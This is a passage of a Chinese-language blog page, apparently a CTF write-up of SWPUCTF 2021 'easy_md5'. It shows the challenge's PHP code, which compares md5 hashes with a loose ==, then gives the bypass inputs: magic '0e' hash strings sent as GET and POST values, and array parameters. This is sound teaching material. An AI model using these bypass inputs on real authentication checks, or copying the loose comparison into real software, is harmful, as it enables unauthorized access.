class="variable">$flag</span>.PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="SWPUCTF-2021-新生赛-easy-md5"><a href="#SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_md5"></a>[SWPUCTF 2021 新生赛]easy_md5</h1><h2 id="知识点：MD5碰撞-0e绕过-数组绕过"><a href="#知识点：MD5碰撞-0e绕过-数组绕过" class="headerlink" title="知识点：MD5碰撞 0e绕过 数组绕过"></a>知识点：MD5碰撞 0e绕过 数组绕过</h2><p>题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="keyword">include</span> <span class="string">&#x27;flag2.php&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="variable">$password</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;wrong!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>关键是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($name != $password &amp;&amp; md5($name) == md5($password))</span><br></pre></td></tr></table></figure>
+
+<p>md5相同，本身的值却不同？</p>
+<p>这样的称为MD5碰撞</p>
+<p>去搜索引擎搜索md5碰撞案例</p>
+<p>常见的md5加密后以0e开头的字符串。<br>QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s21587387a</p>
+<p>值得注意的是：<strong>GET请求将参数包含在URL中，而POST请求将参数放在请求正文中。</strong></p>
+<p>因此需要把get，也就是name，传给url，把post，也就是password，传给请求正文</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=QNKCDZO</span><br></pre></td></tr></table></figure>
+
+<p>post:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=s878926199a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20240314211923865.png" alt="image-20240314211923865"></p>
+<p><strong>方法二：</strong> 可以传递数组，如name[]&#x3D;123,password[]&#x3D;456，md5不能加密数组，故两个md5返回的都是null</p>
+
+</div> 
+
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+        </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2024/03/12/hyperv_kali/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
+
+    
+      <div class="post-comment">
+
+     
+
+     
+
+
+    
+       <!--PC版-->
+        <div id="SOHUCS" ></div>
+        <script charset="utf-8" type="text/javascript" src="https://cy-cdn.kuaizhan.com/upload/changyan.js" ></script>
+        <script type="text/javascript">
+        window.changyan.api.config({
+            appid: 'cywJvGKKO',
+            conf: 'prod_dfd0ec91693832034dcc62943592b045'
+        });
+        </script>   
+     
+
+</div>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                
+                <br>
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+    
+    
+
+  </body>
+</html>
